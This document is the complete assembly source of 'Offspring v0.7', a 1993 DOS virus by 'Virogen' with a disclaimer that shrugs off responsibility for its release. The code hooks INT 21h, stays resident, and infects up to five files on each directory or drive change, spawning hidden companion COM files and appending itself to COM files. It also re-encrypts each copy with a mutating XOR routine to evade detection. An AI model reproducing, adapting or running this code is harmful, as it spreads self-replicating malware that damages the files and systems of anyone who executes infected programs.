;-------------------------------------------------------------------------
; ************************************************
;     OFFSPRING v0.7 - BY VIROGEN - 04-26-93
; ************************************************
;
;  - Compatible with A86 v3.22
;
;
;  DISCLAIMER : Don't hold me responsible for any damages, or the release
;               of this virus. Use at your own risk.
;
;  TYPE : Parastic Spawning Resident Encrypting (PSRhA)
;
;
;  VERSION : BETA 0.7
;
;  INFECTION METHOD :  Everytime DOS function 3Bh (change dir) or function
;                      0Eh (change drive) is called the virus will infect
;                      up to 5 files in the current directory (the one
;                      you're coming out of). It will first infect all
;                      EXE files by creating a corresponding COM. Once
;                      all EXE files have been infected, it then infects
;                      COM files. All COM files created by a spawning
;                      infection will have the read-only and hidden
;                      attribute.
;
;
;  THE ENCRYPION OF THIS VIRUS :
;                      Ok, this virus's encryption method is a simple
;                      XOR. The encryption operands are changed directly.
;                      Also, the operands are switched around, and the
;                      bytes between them are constantly changed. The
;                      call to the encryption routine changes, so the
;                      address can be anywhere in a field of NOPs.
;                      Not anything overly amazing, but it works.
;
;
	TITLE	OFFSPRING_1
	.286
CSEG	SEGMENT
	ASSUME	CS: CSEG, SS: CSEG, ES: CSEG

SIGNAL	EQU	7DH		; Installation check
REPLY	EQU	0FCH		; reply to check
CR	EQU	0DH		; carraige return
LF	EQU	0AH		; line feed
F_NAME	EQU	1EH		; Offset of file name in FF/FN buffer
F_SIZEL	EQU	1CH		; File size - low
F_SIZEH	EQU	1AH		; File size - high
F_DATE	EQU	18H		; File date
F_TIME	EQU	16H		; File time
MAX_INF	EQU	05		; Maximum files to infect per run
MAX_ROTATION EQU 9		; number of bytes in switch byte table
PARASTIC EQU	01		; Parastic infection
SPAWN	EQU	00		; Spawning infection

	ORG	100H		; Leave room for PSP

;------------------------------------------------------------------
; Start of viral code
;------------------------------------------------------------------

START:

	DB	0BEH		; MOV SI,xxxx - Load delta offset
SET_SI:	DW	0000H

SKIP_DEC: JMP	NO_DEC		; Skip decryption, changes into NOP on
				; replicated copies.
M_SW1:	NOP			; changs into a byte in op_set
XCHG_1	DB	0BFH
	DW	OFFSET ENC_DATA+2 ; Point to byte after encryption num
				; Switches positions with XCHG_2
M_SW2:	NOP			; changes into a byte in op_set
XCHG_2	DB	090H
ENC_NUM	DW	9090H
M_SW3:	NOP

DI_INS:	DW	0C783H		; ADD DI,0 - changes to ADD DI,xxxx
ADD_DI:	DW	9000H		; 00-NOP

CALL_ENC DB	0E8		; Call encryption routine - address changes
E_JMP	DW	(OFFSET END_ENCRYPT-OFFSET E_JMP+2)
	NO_DEC:
	JMP	MAIN		; Jump to virus code

;-----------------------------------------------
; Data area
;-----------------------------------------------

ENC_DATA DW	0000		; Start of encrypted data
ROT_NUM	DW	0000		; Used when replacing bytes with OP_SET
VTYPE	DB	00		; Spawning or Parastic Infection?
INF_COUNT DB	0		; How many files we have infected this run
COM_NAME DB	'COMMAND.COM'	; obvious
NEW_CODE DW	9090H		; ID bytes
NEW_JMP	DB	0E9H,00,00	; New Jump
FIRST_FIVE DB	5 DUP(0)	; original first five bytes of parasic inf.
ADD_MEM	DB	0		; restore mem size? Yes,No

ID	DB	CR,LF,'(c)1993 negoriV',CR,LF ; my copyright
VNAME	DB	CR,LF,'* Thank you for providing me and my offspring with a safe place to live *'
	DB	CR,LF,'* Offspring I v0.07. *',CR,LF,'$'

FNAME1	DB	'*.EXE',0	; Filespec
FNAME2	DB	'*.COM',0	; Filespec
FNAME_OFF DW	FNAME1		; Offset of Filespec to use
TIMES_INC DB	0		; # of times encryption call incremented
SL	DB	'\'		; Backslash for directory name
FILE_DIR DB	64 DUP(0)	; directory of file we infected
FILE_NAME DB	13 DUP(0)	; filename of file we infected
OLD_DTA	DD	0		; old seg:off of DTA
OLD21_OFS DW	0		; Offset of old INT 21H
OLD21_SEG DW	0		; Seg of old INT 21h
NEW_SEG	DW	0		; New segment in high mem

PAR_BLK	DW	0		; command line count byte   -psp
PAR_CMD	DW	0080H		; Point to the command line -psp
PAR_SEG	DW	0		; seg
	DW	05CH		; Use default FCB's in psp to save space
PAR1	DW	0		;        
	DW	06CH		; FCB #2
PAR2	DW	0		; 

;--------------------------------------------------------------------
; INT 21h
;---------------------------------------------------------------------

NEW21	PROC			; New INT 21H handler

	CMP	AH, SIGNAL	; signaling us?
	JNE	NO
	MOV	AH,REPLY	; yep, give our offspring what he wants
	JMP	END_21
	NO:
	CMP	AH, 3BH		; set dir func?
	JE	RUN_RES
	CMP	AH,0EH		; set disk func?
	JE	RUN_RES

	JMP	END_21

	RUN_RES:
	PUSHF
	PUSH	AX		; Push regs
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DI
	PUSH	SI
	PUSH	BP
	PUSH	DS
	PUSH	ES
	PUSH	SP
	PUSH	SS

	PUSH	CS
	POP	DS

        XOR     AX,AX           ; nullify ES
	MOV	ES,AX

        CMP     ADD_MEM,1       ; Restore system conventional mem size?
        JE      REL_MEM         ;
        CMP     AH,48H          ; alloc. mem block? If so we subtract 3k from
        JE      SET_MEM         ; total system memory.
        
	JMP	NO_MEM_FUNC

	SET_MEM:
        SUB     WORD PTR ES: [413H],3   ; Subtract 3k from total sys mem
        INC     ADD_MEM                 ; make sure we know to add this back
        JMP     NO_MEM_FUNC
	REL_MEM:
        ADD     WORD PTR ES: [413H],3   ; Add 3k to total sys mem
        DEC     ADD_MEM


	NO_MEM_FUNC:
	MOV	AH,2FH
	INT	21H		; Get the DTA

	MOV	AX,ES
	MOV	WORD PTR OLD_DTA,BX
	MOV	WORD PTR OLD_DTA+2,AX
	PUSH	CS
	POP	ES

	CALL	RESIDENT	; Call infection kernal

	MOV	DX,WORD PTR OLD_DTA
	MOV	AX,WORD PTR OLD_DTA+2
	MOV	DS,AX
	MOV	AH,1AH
	INT	21H		; Restore the DTA

	POP	SS		; Pop regs
	POP	SP
	POP	ES
	POP	DS
	POP	BP
	POP	SI
	POP	DI
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	POPF
	END_21	:
	JMP	[ DWORD PTR CS: OLD21_OFS] ; jump to original int 21h
	IRET
	NEW21	ENDP		; End of handler


;------------------------------------------------------------
;  Main
;-----------------------------------------------------------
MAIN	PROC

	MOV	WORD PTR [SI+OFFSET SKIP_DEC],9090H ; NOP the jump past decryption
	MOV	BYTE PTR [SI+OFFSET SKIP_DEC+2],90H

	MOV	AX,DS: 002CH	; Get environment address
	MOV	[SI+OFFSET PAR_BLK],AX ; Save in parameter block for exec

	MOV	[SI+OFFSET PAR1],CS ; Save segments for EXEC
	MOV	[SI+OFFSET PAR2],CS
	MOV	[SI+OFFSET PAR_SEG],CS

	MOV	AH,2AH		; Get date
	INT	21H

	CMP	DL,14		; 14th?
	JNE	NO_DISPLAY

	MOV	AH,09		; Display message
	LEA	DX,[SI+OFFSET ID]
	INT	21H

	NO_DISPLAY:
	CALL	INSTALL		; check if installed, if not install

	CMP	BYTE PTR [SI+OFFSET VTYPE],PARASTIC
	JE	SKIP_THIS
	MOV	BX,(OFFSET VEND+50) ; Calculate memory needed
	MOV	CL,4		; divide by 16
	SHR	BX,CL
	INC	BX
	MOV	AH,4AH
	INT	21H		; Release un-needed memory

	LEA	DX,[SI+OFFSET FILE_DIR -1] ; Execute the original EXE
        LEA     BX,[SI+OFFSET PAR_BLK]
        MOV     AX,4B00H
        INT     21H

	MOV	AH,4CH		; Exit
	INT	21H

	SKIP_THIS:

	MOV	CX,5		; Restore original first
	ADD	SI,OFFSET FIRST_FIVE ; five bytes of COM file
	MOV	DI,0100H
	CLD
	REP	MOVSB

        MOV     AX,0100H        ; Simulate CALL return to 0100h
	PUSH	AX
	RET

MAIN	ENDP

;---------------
; INSTALL - Install the virus
;--------------

INSTALL	PROC

	MOV	AH,SIGNAL
	INT	21H
	CMP	AH,REPLY
	JE	NO_INSTALL

	MOV	AX,CS
	DEC	AX
	MOV	DS,AX
	CMP	BYTE PTR DS: [0],'Z' ;Is this the last MCB in
				;the chain?
	JNE	NO_INSTALL


	MOV	AX,DS: [3]	;Block size in MCB
        SUB     AX,190          ;Shrink Block Size-quick estimate
	MOV	DS: [3],AX

	MOV	BX,AX
	MOV	AX,ES
	ADD	AX,BX
	MOV	ES,AX		;Find high memory seg

	PUSH	SI
	ADD	SI,0100H
	MOV	CX,(OFFSET VEND - OFFSET START)
	MOV	AX,DS
	INC	AX
	MOV	DS,AX
	MOV	DI,100H		; New location in high memory
	CLD
	REP	MOVSB		; Copy virus to high memory

	POP	SI
	MOV	DS: NEW_SEG,ES	;Save new segment

	PUSH	ES
	POP	DS
	XOR	AX,AX
	MOV	ES,AX		; null es
	MOV	AX,ES: [21H*4+2]
	MOV	BX,ES: [21H*4]
	MOV	DS: OLD21_SEG,AX ; Store segment
	MOV	DS: OLD21_OFS,BX ; Store offset

	CLI

	MOV	ES: [21H*4+2],DS ; Save seg
	LEA	AX,[OFFSET NEW21]
	MOV	ES: [21H*4],AX	; off

	STI

	NO_INSTALL:
	PUSH	CS		; Restore regs
	POP	DS
	MOV	ES,DS

	RET
INSTALL	ENDP

;------------------------
; Resident - This is called from the INT 21h handler
;-----------------------------
RESIDENT PROC

        MOV     VTYPE,SPAWN
        MOV     WORD PTR SET_SI,0000     ; SI=0000 on load
        MOV     BYTE PTR DI_INS,83H      ; ADD DI,0 op
        MOV     WORD PTR ADD_DI,9000H    ; 0090h for ADD DI,00
        MOV     BYTE PTR INF_COUNT,0     ; null infection count
	MOV	FNAME_OFF, OFFSET FNAME1 ; Set search for *.EXE

FIND_FIRST:
	MOV	WORD PTR VEND,0	; Clear ff/fn buffer
	LEA	SI, VEND
	LEA	DI, VEND+2
	MOV	CX,22
	CLD
	REP	MOVSW

				; Set DTA address - This is for the Findfirst/Findnext INT 21H functions
	MOV	AH, 1AH
	LEA	DX, VEND
	INT	21H

	MOV	AH, 4EH		; Findfirst
	MOV	CX, 0		; Set normal file attribute search
	MOV	DX, FNAME_OFF
	INT	21H

	JNC	NEXT_LOOP	; if still finding files then loop
	JMP	END_PROG

	NEXT_LOOP :
	CMP	VTYPE, PARASTIC	; parastic infection?
	JE	START_INF	; yes, skip all this

	MOV	AH,47H
	XOR	DL,DL
	LEA	SI,FILE_DIR
	INT	21H

	CMP	WORD PTR VEND[F_SIZEL],0 ; Make sure file isn't 64k+
	JE	OK_FIND		; for spawning infections
	JMP	FIND_FILE

OK_FIND:
	XOR	BX,BX
	LM3	:		; find end of directory name
	INC	BX
	CMP	FILE_DIR[BX],0
	JNE	LM3

	MOV	FILE_DIR[BX],'\' ; append backslash to path
	INC	BX

	MOV	CX,13		; append filename to path
	LEA	SI,VEND[F_NAME]
	LEA	DI,FILE_DIR[BX]
	CLD
	REP	MOVSB

	XOR	BX,BX
	MOV	BX,1EH

	LOOP_ME: 		; search for filename ext.
	INC	BX
	CMP	BYTE PTR VEND[BX], '.'
	JNE	LOOP_ME

	INC	BX		; change it to COM
	MOV	WORD PTR VEND [BX],'OC'
	MOV	BYTE PTR VEND [BX+2],'M'


START_INF:

	CMP	VTYPE, PARASTIC	; parastic infection?
	JE	PARASTIC_INF	; yes.. so jump

;--------------------------------------
; Spawning infection

	LEA	DX, VEND[F_NAME]
	MOV	AH, 3CH		; Create file
	MOV	CX, 02H		; READ-ONLY
	OR	CX, 01H		; Hidden
	INT	21H		; Call INT 21H
	JNC	CONTIN		; If Error-probably already infected
	JMP	NO_INFECT
	CONTIN:

	INC	INF_COUNT
	MOV	BX,AX

	JMP	ENCRYPT_OPS
;----------------------------------------
; Parastic infection

	PARASTIC_INF :

        CMP     VEND[F_SIZEh],400H
        JGE     CONT_INF2
        JMP     NO_INFECT

        CONT_INF2:

        LEA     SI,VEND[F_NAME] ; Is Command.COM?
	LEA	DI,COM_NAME
	MOV	CX,11
	CLD
	REPE	CMPSB

	JNE	CONT_INF0	; Yes, don't infect
	JMP	NO_INFECT

	CONT_INF0:

	MOV	AX,3D02H	; Open file for reading & writing
	LEA	DX,VEND[F_NAME]	; Filename in FF/FN buffer
	INT	21H

	JNC	CONT_INF1	; error, skip infection
	JMP	NO_INFECT

	CONT_INF1:

        
	MOV	BX,AX

	MOV	AH,3FH		; Read first five bytes of file
	MOV	CX,05
	LEA	DX,FIRST_FIVE
	INT	21H

	CMP	WORD PTR FIRST_FIVE,9090H
	JNE	CONT_INF
	MOV	AH,3EH
	INT	21H
	JMP	NO_INFECT

CONT_INF:
        INC     INF_COUNT
        MOV     AX,4202H        ; Set pointer to end of file, so we
	XOR	CX,CX		; can find the file size
	XOR	DX,DX
	INT	21H

				;SUB     AX,0100h          ; Subtract PSP size
        MOV     WORD PTR SET_SI,AX  ; Change the MOV SI inst.
        MOV     WORD PTR ADD_DI,AX  ; ADD DI,xxxx
	MOV	BYTE PTR DI_INS,81H ; ADD DI op

	MOV	AX,4200H
	XOR	CX,CX
	XOR	DX,DX
	INT	21H

	MOV	AX,VEND[F_SIZEH]
	SUB	AX,5
	MOV	WORD PTR NEW_JMP+1,AX


	MOV	AH,40H
	MOV	CX,6
	LEA	DX,NEW_CODE
	INT	21H

	MOV	AX,4202H
	XOR	CX,CX
	XOR	DX,DX
	INT	21H


ENCRYPT_OPS:

;-----------------------------
; Change encryptions ops

	PUSH	BX

	MOV	AX,WORD PTR XCHG_1 ; Switch XCHG_1, and XCHG_2
	MOV	BX,WORD PTR XCHG_2
	MOV	WORD PTR XCHG_1,BX
	MOV	WORD PTR XCHG_2,AX
	MOV	AH, BYTE PTR XCHG_1+2
	MOV	BH, BYTE PTR XCHG_2+2
	MOV	BYTE PTR XCHG_1+2,BH
	MOV	BYTE PTR XCHG_2+2,AH

XOR_DONE:

CHG_TWO:
	XOR	CX,CX		; CX=0
	LEA	DI,SW_BYTE1	; DI->sw_byte1

CHG_REST:
	INC	ROT_NUM		; increment rotation number
	MOV	BX,ROT_NUM	; bx=rotation num
	MOV	AH,OP_SET[BX]	; ah = new op code from set
	MOV	BYTE PTR [DI],AH

	CMP	ROT_NUM,MAX_ROTATION ; max rotation num?
	JNE	CHG_CNT		; no, chg_cnt
	MOV	WORD PTR ROT_NUM,0 ; reset rotation num
CHG_CNT:
	INC	CX		; increment count
	CMP	CX,1
	LEA	DI,M_SW1
	JE	CHG_REST
	CMP	CX,2
	LEA	DI,M_SW2
	JE	CHG_REST
	CMP	CX,3
	LEA	DI,M_SW3
	JE	CHG_REST
	CMP	CX,4
	LEA	DI,SW_BYTE1
	JE	CHG_REST

CHG_THREE:
	XOR	CX,CX
	LEA	DI,SW_BYTE3
CHG_FOUR:
        CMP     BYTE PTR [DI],47H    ;  is first byte (of 3rd) 'INC DI'?
        MOV     BX,1                 ;
        JE      MOV_POS              ;  Yes, so change it to the second
        CMP     BYTE PTR [DI+1],47H  ;  is second byte 'INC DI'
        MOV     BX,2                 ;
        JE      MOV_POS              ;  Yes, change it to the third
        XOR     BX,BX                ;  Else, must be in final position
MOV_POS: MOV    WORD PTR [DI],9090H  ;  set all three bytes (of 3rd)
        MOV     BYTE PTR [DI+2],90H  ;  to NOP
        MOV     BYTE PTR [DI+BX],47H ;  place 'INC DI' in necessary pos.

	CMP	BX,2
	JNE	NO_CHANGE
	INC	CX
	CMP	CX,2
	LEA	DI,SW_BYTE4
	JNE	CHG_FOUR

NO_CHANGE:
	CMP	BYTE PTR TIMES_INC,9
	JE	INC_NUM
	INC	WORD PTR B_WR
	INC	WORD PTR E_JMP
	INC	WORD PTR E_JMP
	INC	TIMES_INC
	JMP	D2
INC_NUM:
	SUB	WORD PTR B_WR,09
	SUB	WORD PTR E_JMP,18
	MOV	TIMES_INC,0

;-----------------------
; Get random XOR number, save it, copy virus, encrypt code

D2:

	MOV	AH,2CH		;
	INT	21H		; Get random number from clock - millisecs

	MOV	WORD PTR XOR_OP+2,DX ; save encryption #


	MOV	SI,0100H
	LEA	DI,VEND+50	; destination 
	MOV	CX,OFFSET VEND-100H ; bytes to move
	CLD
	REP	MOVSB		; copy virus outside of code


	LEA	DI,VEND+ENC_DATA-204 ; offset of new copy of virus
	CMP	BYTE PTR VTYPE, PARASTIC
	JNE	GO_ENC
				;add     di,si

GO_ENC:
	CALL	ENCRYPT		; encrypt new copy of virus

;----------------------------------------
; Write and close new infected file

	POP	BX
	MOV	CX, OFFSET VEND-100H ; # of bytes to write
	LEA	DX, VEND+50	; Offset of buffer
	MOV	AH, 40H		; -- our program in memory
	INT	21H		; Call INT 21H function 40h

        CMP     VTYPE, PARASTIC ; parastic?
        JNE     CLOSE           ; no, don't need to restore date/time

        MOV     AX,5701H          ; Restore data/time
	MOV	CX,VEND[F_TIME]
	MOV	DX,VEND[F_DATE]
	INT	21H


CLOSE:	MOV	AH, 3EH
	INT	21H


NO_INFECT:

; Find next file
	FIND_FILE :

	CMP	INF_COUNT, MAX_INF
	JE	END_PROG
	MOV	AH,4FH
	INT	21H
	JC	END_PROG
	JMP	NEXT_LOOP


	END_PROG:
	EXIT	:
        CMP     INF_COUNT,0     ; Start parastic infection on next run
        JNE     FIND_DONE
        CMP     VTYPE, PARASTIC ; Parastic infection done?
        JE      FIND_DONE       ; yes, we're finished
        MOV     FNAME_OFF, OFFSET FNAME2     ; Point to new filespec
        MOV     VTYPE, PARASTIC              ; virus type = parastic
	JMP	FIND_FIRST


	FIND_DONE:
	MOV	VTYPE,SPAWN
	MOV	FNAME_OFF, OFFSET FNAME1
	RET
RESIDENT ENDP

END_ENCRYPT: 			; Let's encrypt everything up to here
OP_SET	DB	90H		; NOP
	DB	40H		; INC AX
	DB	43H		; INC BX
	DB	48H		; DEC AX
	DB	4BH		; DEC BX
	DB	0FBH		; STI
	DB	0FCH		; CLD
	DB	4AH		; DEC DX
	DB	42H		; INC DX
	DB	14 DUP(090H)
;------------------------------------------------
; Encrypt/Decrypt Routine
;-----------------------------------------------

ENCRYPT	PROC
CX_M	DB	0B9H		; MOV CX
B_WR	DW	(OFFSET END_ENCRYPT-OFFSET ENC_DATA)/2
	E2:
SW_BYTE1: 			; XOR [di],dx swaps positions with this
	NOP
XOR_OP:	XOR	WORD PTR [DI],0666H ; Xor each word - number changes accordingly
SW_BYTE3: 			; INC DI changes position in these bytes
	INC	DI
	NOP
	NOP
SW_BYTE4: 			; INC DI changes position in these bytes
	INC	DI
	NOP
	NOP
SW_BYTE2:
	NOP			; This byte changes into a char in op_set
	LOOP	E2		; loop while cx != 0

	RET

ENCRYPT	ENDP

VEND	DW	0		; End of virus

CSEG	ENDS
	END	START
